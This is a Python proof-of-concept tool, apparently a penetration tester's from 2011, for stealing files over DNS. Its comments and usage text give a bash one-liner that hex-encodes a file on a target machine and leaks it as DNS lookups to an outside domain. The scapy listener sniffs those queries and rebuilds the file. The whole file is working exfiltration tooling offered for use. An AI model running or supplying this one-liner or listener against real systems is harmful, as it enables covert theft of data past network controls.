# PoC cheap DNS data exfiltration tool, used to reassemble files sent in hex. 
# Usage:
# python dns_catch.py <key> <outputfile>
#
# Use the following one liner to pump the file out from the target:
#
# file="secretz.tgz"; key="moobar"; domain="sensepost.com"; i=1; md=$(cat $file| md5sum| cut -d " " -f 1); len=$((`xxd -p $file |wc -l`)); for h in `cat $file | xxd -p`; do host $h.0.$i.$len.$key.$domain; i=$(($i+1));done; host $md.1.$i.$len.$key.$domain
#
# glenn@sensepost.com / 2011

from scapy.all import *
import binascii
import hashlib
import sys
import time

last_seqn=-1
result=""
thesrc=""
recvd_seqns=[]
lines_rcvd=0


if len(sys.argv) != 3:
	print 'Usage: dns_catch.py key outfile'
	print 'e.g dns_catch.py moo secretfile.txt'
	print '\nOn target system execute via bash:'
	print 'file=\"secretz.tgz\"; key=\"moo\"; domain=\"sensepost.com\" i=1; md=$(cat $file| md5sum| cut -d \" \" -f 1); len=$((`xxd -p $file |wc -l`)); for h in `cat $file | xxd -p`; do host $h.0.$i.$len.$key.$domain; i=$(($i+1));done; host $md.1.$i.$len.$key.$domain'	
	print '\nglenn@sensepost.com / 2011'
	exit()

key = sys.argv[1]
outfile = sys.argv[2]

def md5_file(fname):

	f = open(fname,'rb')
	m = hashlib.md5()
	while True:
    		## Don't read the entire file at once...
    		data = f.read(10240)
    		if len(data) == 0:
        		break
    		m.update(data)
	f.close()
	return m.hexdigest()

def handle_dns_packet(x):
	global last_seqn
	global recvd_seqns
	global result
	global thesrc
	global lines_rcvd
	global key
	global outfile
	global start_time
	
        try:
		src=x.payload.src
                qname=x.payload.payload.payload.qd.qname
        except Exception:
                #print "This packet didn't match what we expected: "+str(x)
                return
	parts=qname.split(".")

	if( len(parts) >7 and parts[4] == key and int(parts[2]) not in recvd_seqns):			#Check if DNS packet looks like the kind we like

		if(thesrc == ""):
			thesrc=src
		if(src==thesrc):					#Ignore replies
			lines_rcvd+=1
			data=parts[0]
			is_last=int(parts[1])
			seqn=int(parts[2])
			size=int(parts[3])
			if(last_seqn==-1):
				last_seqn=0
                                start_time=time.time()

			if(seqn != last_seqn+1):
				sys.exit("Data came out of order. Was expecting %d, recieved %d. Exiting :(" %(last_seqn+1, seqn) )
			if(is_last==1):
				outf=open(outfile,"wb")
				print "[+] Last chunk received. Decoding and writing to %s" %outfile
				for i in range(0,len(result),2):
					outf.write(binascii.a2b_hex(result[i:i+2]))
				outf.close()
				md5_remote=md5_file(outfile)
				md5_local=data

				if( md5_remote == md5_local):
					print "[*] Received MD5 matches local, nice! (%s)" %data
				else:
					print "[!] Received MD5 does not match local file, fail :( (rcv'd %s, expected %s)" %(md5_remote, md5_local)
				sys.exit()
			else:
				sofar=int(time.time() - start_time)
				if sofar==0:
					sofar=1
				avg_time_per_line = float(sofar) / lines_rcvd
				lines_remaining = size - lines_rcvd
				time_til_complete = lines_remaining * avg_time_per_line

				print "[+] Recv'd \"%s\" %d of %d (~%d seconds remaining)" %(data, lines_rcvd,size, time_til_complete)
				#print "sofar=%d, lines_rcvd=%d ,lines_remaining=%d, avg_time_per_line=%f, time_til_complete=%f" %(sofar, lines_rcvd ,lines_remaining, avg_time_per_line, time_til_complete  )
				recvd_seqns.append(seqn)
				last_seqn=seqn
				result+=data
#	else:
#		print "[-] Ignoring DNS packet - %s" %qname

print "[+] Waiting for DNS packets for subdomain %s (i.e. %s.yourdomain.com)" %(key,key)
sniff(filter="udp and port 53", prn=handle_dns_packet)
